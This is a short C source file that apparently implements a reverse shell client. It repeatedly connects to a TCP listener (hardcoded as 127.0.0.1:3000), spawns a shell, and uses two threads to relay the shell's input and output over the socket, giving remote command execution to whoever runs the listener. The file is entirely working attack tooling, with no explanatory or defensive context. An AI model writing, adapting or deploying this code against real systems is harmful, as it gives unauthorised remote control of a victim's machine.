#include "fd.h"
#include "shell.h"
#include "tcp.h"

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

Shell shell;
socket_t sock = -1;

void *
shell_stdin_from_server(void *args)
{
    char store[FD_CHUNK_SIZE];

    while (1)
    {
        memset(store, 0x00, FD_CHUNK_SIZE);

        fd_read(sock, store);

        fd_write(shell.stdin, store);
    }
}

void *
shell_stdout_to_server(void *args)
{
    char store[FD_CHUNK_SIZE];

    while (1)
    {
        memset(store, 0x00, FD_CHUNK_SIZE);
        
        fd_read(shell.stdout, store);

        fd_write(sock, store);
    }
}

void
use_shell()
{
    shell = shell_open();
    puts("Done opening the shell");

    pthread_t thread_recv;
    if (pthread_create(&thread_recv, NULL, shell_stdin_from_server, NULL) != 0)
    {
        puts("Failed to create receiver thread.");
        return;
    }

    pthread_t thread_push;
    if (pthread_create(&thread_push, NULL, shell_stdout_to_server, NULL) != 0)
    {
        puts("Failed to create pusher thread.");
        return;
    }

    pthread_join(thread_recv, NULL);
    pthread_join(thread_push, NULL);
}

int
main(int argc, char **argv)
{
    while (sock == -1)
    {
        puts("Opening socket");
        sock = tcp_open("127.0.0.1", 3000);

        if (sock == -1)
        {
            puts("Socket opening failed");
        }
        else
        {
            puts("Done opening socket!");
            puts("Biding to shell...");

            use_shell();
        }
    }

    return 0;
}
